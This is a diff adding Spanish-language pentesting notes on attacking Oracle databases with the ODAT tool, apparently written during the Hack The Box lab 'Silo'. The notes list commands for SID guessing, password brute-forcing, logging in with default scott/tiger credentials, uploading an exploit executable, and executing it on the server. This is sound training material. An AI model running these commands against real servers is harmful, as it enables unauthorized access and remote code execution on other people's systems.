@@ -127,3 +127,22 @@ L9000: Puerto local a publicar
 10.10.10.73 Servidor mediante el cual se realizará la salida.
 
 Al final en el navegador se consultará como http://localhost:9000
+****************************************************Oracle***************************************************
+https://github.com/quentinhardy/odat
+Con el programa odat se puede realizar una enumeración del objetivo
+python3 odat.py sidguesser -s 10.10.10.82 -p 1521 --> Para tratar de averiguar los SID
+python3 odat.py passwordgesser -s 10.10.10.82 -p 1521 -d EXE --accounts-file accounts/oracle_default_password.txt --> Con este comando se realiza un ataque de fuerza bruta con el archivo oracle_default_password.txt, el cual es copiado del directorio de metasploit a la carpeta accounts del programa ODAT, es importante no dejar espacios en el archivo. con vi :%s/ /\//g 
+python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ oracle.exe ~/HackTheBox/silo/oracle.exe --> utlfile: se usa para subir archivos --sysdba: se usa para decirle que es administrador --putfile: a.) va la ruta donde quiere dejarse el archivo, preferiblemente en "C:\ exploit.exe" se debe dejar un espacio en la ruta del archivo. c). por último la ruta donde se encuentra localmente el exploit.
+python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ oracle.exe --> externaltable p--exec para ejecución de algún archivo en el servidor.
+
+Para conectarse a la dbs oracle, desde kali:
+sudo -s
+source /etc/profile
+sqlplus scott/tiger@10.10.10.82:1521/XE
+
+NOTA: La máquina de HTB Silo, describe muy bien el procedimiento
+https://www.youtube.com/watch?v=2c7SzNo9uoA&feature=emb_title
+
+
+
+
